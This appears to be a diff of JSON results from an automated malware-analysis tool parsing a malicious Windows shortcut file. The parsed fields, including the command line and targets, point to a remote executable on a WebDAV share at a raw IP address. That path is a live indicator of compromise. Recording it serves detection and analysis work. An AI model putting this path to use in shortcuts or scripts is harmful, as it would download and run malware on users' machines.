@@ -64,6 +64,9 @@
         "tags": {
           "file": {
             "shortcut": {
+              "command_line": [
+                "\\\\104.156.149.33@80\\yes\\4556qXbHiTtYxMXnMwXziAARUlvy.exe"
+              ],
               "icon_location": [
                 "\\\\104.156.149.33@80\\yes\\ico\\5.ico"
               ]
@@ -107,8 +110,9 @@
       {
         "auto_collapse": false,
         "body": {
-          "cmdline": "\\\\104.156.149.33@80\\yes\\4556qXbHiTtYxMXnMwXziAARUlvy.exe",
-          "icon_location": "\\\\104.156.149.33@80\\yes\\ico\\5.ico"
+          "icon_location": "\\\\104.156.149.33@80\\yes\\ico\\5.ico",
+          "target_ansi": "\\\\104.156.149.33@80\\yes\\4556qXbHiTtYxMXnMwXziAARUlvy.exe",
+          "target_unicode": "\\\\104.156.149.33@80\\yes\\4556qXbHiTtYxMXnMwXziAARUlvy.exe"
         },
         "body_config": {},
         "body_format": "KEY_VALUE",
@@ -166,6 +170,13 @@
           "heur_id": 7,
           "signatures": [],
           "value": "4556qXbHiTtYxMXnMwXziAARUlvy.exe"
+        }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "\\\\104.156.149.33@80\\yes\\4556qXbHiTtYxMXnMwXziAARUlvy.exe"
         }
       ],
       "file.shortcut.icon_location": [
